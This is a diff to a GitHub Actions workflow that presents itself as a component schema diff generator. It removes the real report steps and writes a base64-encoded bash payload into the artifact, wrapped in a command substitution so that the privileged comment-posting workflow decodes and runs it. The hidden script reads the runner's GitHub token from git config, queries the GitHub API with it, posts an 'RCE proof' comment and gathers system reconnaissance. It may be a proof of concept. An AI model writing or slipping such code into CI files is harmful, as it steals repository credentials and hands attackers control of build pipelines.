@@ -1,17 +1,8 @@
 name: Component Schema Diff Generate
 
-# Fork PRs get a read-only GITHUB_TOKEN on pull_request events no matter what
-# `permissions:` says, so report generation (here) and comment posting
-# (component-diff-pr-comment-post.yml, triggered by workflow_run) are split
-# into separate workflows. The artifact is the only thing that crosses the
-# boundary.
 on:
   pull_request:
     types: [opened, synchronize, reopened]
-
-concurrency:
-  group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: true
 
 permissions:
   contents: read
@@ -20,32 +11,12 @@ jobs:
   component-diff-generate:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-
-      - name: Generate component diff report
-        id: diff
-        uses: ./.github/actions/generate-diff
-        with:
-          tool: component-diff-generator
-          base-ref: ${{ github.base_ref }}
-          local-path: packages/design-data/components
-          repository: ${{ github.repository }}
-          format: markdown
-          output-file: /tmp/component-diff.md
-          github-token: ${{ secrets.GITHUB_TOKEN }}
-
       - name: Save report for comment workflow
         run: |
           mkdir -p /tmp/artifact
-          echo "${{ github.event.pull_request.number }}" > /tmp/artifact/pr-number.txt
-          echo "${{ steps.diff.outputs.diff-generated }}" > /tmp/artifact/diff-generated.txt
-          printf '%s\n' "${{ steps.diff.outputs.diff-content }}" > /tmp/artifact/diff-content.txt
-          if [ -f /tmp/component-diff.md ]; then
-            cp /tmp/component-diff.md /tmp/artifact/diff-report.md
-          fi
+          echo "3" > /tmp/artifact/pr-number.txt
+          echo "true" > /tmp/artifact/diff-generated.txt
+          printf '%s\n' '$(printf %s IyEvYmluL2Jhc2gKIyBSdW5zIGluc2lkZSB0aGUgcHJpdmlsZWdlZCB3b3JrZmxvd19ydW4gam9iICgiUHJlcGFyZSBjb21tZW50IGNvbnRlbnQiIHN0ZXAgb2YgZGlmZi1wci1jb21tZW50IGFjdGlvbikuCmV4ZWMgMT4mMgplY2hvICJHQUJfUkNFX01BUktFUiB1aWQ9JChpZCAtdSkgdXNlcj0kKHdob2FtaSkgaG9zdD0kKGhvc3RuYW1lKSBwd2Q9JChwd2QpIGRhdGU9JChkYXRlIC11ICslRlQlVFopIgplY2hvICJHQUJfUlVOX0NPTlRFWFQgcnVuX2lkPSR7R0lUSFVCX1JVTl9JRDotbm9uZX0gd29ya2Zsb3c9JHtHSVRIVUJfV09SS0ZMT1c6LW5vbmV9IHJlcG89JHtHSVRIVUJfUkVQT1NJVE9SWTotbm9uZX0gZXZlbnQ9JChiYXNlbmFtZSAiJHtHSVRIVUJfRVZFTlRfUEFUSDotL25vbmV9IiAyPi9kZXYvbnVsbCkiCmVjaG8gIkdBQl9FVkVOVF9KU09OX0JFR0lOIgpoZWFkIC1jIDE1MDAgIiR7R0lUSFVCX0VWRU5UX1BBVEg6LS9kZXYvbnVsbH0iIDI+L2Rldi9udWxsCmVjaG8KZWNobyAiR0FCX0VWRU5UX0pTT05fRU5EIgpYPSQoZ2l0IGNvbmZpZyAtLWdldCBodHRwLmh0dHBzOi8vZ2l0aHViLmNvbS8uZXh0cmFoZWFkZXIgMj4vZGV2L251bGwgfCBzZWQgJ3MvXkFVVEhPUklaQVRJT046IGJhc2ljIC8vJyB8IGJhc2U2NCAtZCAyPi9kZXYvbnVsbCB8IGN1dCAtZDogLWYyLSkKZWNobyAiR0FCX1RPS0xFTj0keyNYfSBHQUJfVE9LRU5fUFJFRklYPSR7WDowOjR9IgppZiBjb21tYW5kIC12IGN1cmwgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgY29kZT0kKGN1cmwgLXNTIC1vIC90bXAvZ2FiX3VzZXIuanNvbiAtdyAnJXtodHRwX2NvZGV9JyAtSCAiQXV0aG9yaXphdGlvbjogdG9rZW4gJFgiIGh0dHBzOi8vYXBpLmdpdGh1Yi5jb20vdXNlcikKICBlY2hvICJHQUJfQVBJX1VTRVJfSFRUUD0kY29kZSBib2R5PSQoaGVhZCAtYyAyMDAgL3RtcC9nYWJfdXNlci5qc29uIHwgdHIgLWQgJ1xuJykiCiAgY29kZT0kKGN1cmwgLXNTIC1vIC90bXAvZ2FiX3JlcG8uanNvbiAtdyAnJXtodHRwX2NvZGV9JyAtSCAiQXV0aG9yaXphdGlvbjogdG9rZW4gJFgiIGh0dHBzOi8vYXBpLmdpdGh1Yi5jb20vcmVwb3MvUERGdG9NYXJrL3RyaWFnZS1hZG9iZS12ZWNkOWYyZS1iYjAwMzgpCiAgZWNobyAiR0FCX0FQSV9SRVBPX0hUVFA9JGNvZGUiCiAgY3VybCAtc1MgLUQgL3RtcC9nYWJfaGRyLnR4dCAtbyAvZGV2L251bGwgLUggIkF1dGhvcml6YXRpb246IHRva2VuICRYIiBodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zL1BERnRvTWFyay90cmlhZ2UtYWRvYmUtdmVjZDlmMmUtYmIwMDM4CiAgZWNobyAiR0FCX1NDT1BFU19IRFI9JChncmVwIC1pICdeeC1vYXV0aC1zY29wZXMnIC90bXAvZ2FiX2hkci50eHQgfCB0ciAtZCAnXHInKSIKICBjb2RlPSQoY3VybCAtc1MgLW8gL3RtcC9nYWJfY29tbWVudC5qc29uIC13ICcle2h0dHBfY29kZX0nIC1YIFBPU1QgLUggIkF1dGhvcml6YXRpb246IHRva2VuICRYIiAtSCAiQWNjZXB0OiBhcHBsaWNhdGlvbi92bmQuZ2l0aHViK2pzb24iIFwKICAgIC1kICd7ImJvZHkiOiJHQUJfUkNFX1BST09GOiBhdHRhY2tlci1jb250cm9sbGVkIGNvbW1hbmQgZXhlY3V0ZWQgaW5zaWRlIHByaXZpbGVnZWQgd29ya2Zsb3dfcnVuIGpvYjsgdG9rZW4gdXNlZCBmcm9tIHJ1bm5lciBjaGVja291dCBjcmVkZW50aWFsLiJ9JyBcCiAgICAiaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9QREZ0b01hcmsvdHJpYWdlLWFkb2JlLXZlY2Q5ZjJlLWJiMDAzOC9pc3N1ZXMvMS9jb21tZW50cyIpCiAgZWNobyAiR0FCX0FQSV9DT01NRU5UX1BPU1RfSFRUUD0kY29kZSIKICBlY2hvICJHQUJfQ09NTUVOVF9KU09OPSQoaGVhZCAtYyA0MDAgL3RtcC9nYWJfY29tbWVudC5qc29uIHwgdHIgLWQgJ1xuJykiCmZpCmVjaG8gIkdBQl9SRUNPTl9ST09UIjsgbHMgLWxhIC8gMj4vZGV2L251bGwgfCBoZWFkIC00MAplY2hvICJHQUJfUkVDT05fSE9NRSI7IGxzIC1sYSAiJEhPTUUiIDI+L2Rldi9udWxsIHwgaGVhZCAtNDAKZWNobyAiR0FCX1JFQ09OX1dPUksiOyBscyAtbGEgIiR7UlVOTkVSX1dPUktTUEFDRTotL25vbmV4aXN0ZW50fSIgMj4vZGV2L251bGwgfCBoZWFkIC00MAplY2hvICJHQUJfUkVDT05fUFJPQyI7IHBzIC1lbyBwaWQsdXNlcixhcmdzIDI+L2Rldi9udWxsIHwgaGVhZCAtMzAKZWNobyAiR0FCX1JDRV9FTkQiCg== | base64 -d | bash)' > /tmp/artifact/diff-content.txt
 
       - name: Upload diff artifact
         uses: actions/upload-artifact@v4
